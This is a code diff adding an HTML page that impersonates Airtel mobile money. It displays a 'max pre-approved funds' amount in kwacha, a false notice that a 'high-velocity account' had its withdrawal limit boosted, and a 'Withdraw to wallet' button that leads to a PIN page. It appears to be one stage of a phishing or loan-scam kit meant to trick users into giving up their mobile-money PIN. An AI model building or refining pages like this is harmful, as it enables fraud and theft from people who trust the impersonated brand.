@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Approved Funds</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f4f5f7;
+}
+
+.container {
+    padding: 40px 20px;
+    max-width: 420px;
+    margin: auto;
+}
+
+.card {
+    background: white;
+    border-radius: 25px;
+    padding: 30px 20px;
+    text-align: center;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+}
+
+.logo {
+    width: 70px;
+    height: 70px;
+    background: #d32f2f;
+    color: white;
+    border-radius: 20px;
+    font-size: 32px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: auto;
+}
+
+.amount {
+    font-size: 44px;
+    font-weight: bold;
+    margin: 20px 0;
+}
+
+.note {
+    background: #fdecea;
+    color: #b71c1c;
+    padding: 14px;
+    border-radius: 12px;
+    font-size: 14px;
+    margin-bottom: 25px;
+}
+
+button {
+    width: 100%;
+    padding: 16px;
+    font-size: 18px;
+    border-radius: 16px;
+    border: none;
+    background: black;
+    color: white;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <div class="card">
+
+        <div class="logo">a</div>
+
+        <p style="margin-top:15px;color:#888;">AIRTEL EXECUTIVE LIMIT</p>
+        <p style="font-size:14px;color:#aaa;">MAX PRE-APPROVED FUNDS</p>
+
+        <div class="amount">
+            K <span id="amount">0</span>
+        </div>
+
+        <div class="note">
+            ⚡ High-velocity account detected.  
+            Your withdrawal limit has been boosted automatically.
+        </div>
+
+        <button onclick="goNext()">WITHDRAW TO WALLET →</button>
+
+    </div>
+</div>
+
+<script>
+// Get amount safely
+const params = new URLSearchParams(window.location.search);
+const amount =
+    params.get("amount") ||
+    localStorage.getItem("loanAmount") ||
+    "0";
+
+// Display amount
+document.getElementById("amount").innerText = amount;
+
+// Save for next page
+localStorage.setItem("loanAmount", amount);
+
+function goNext() {
+    window.location.href = "/pin.html";
+}
+</script>
+
+</body>
+</html>
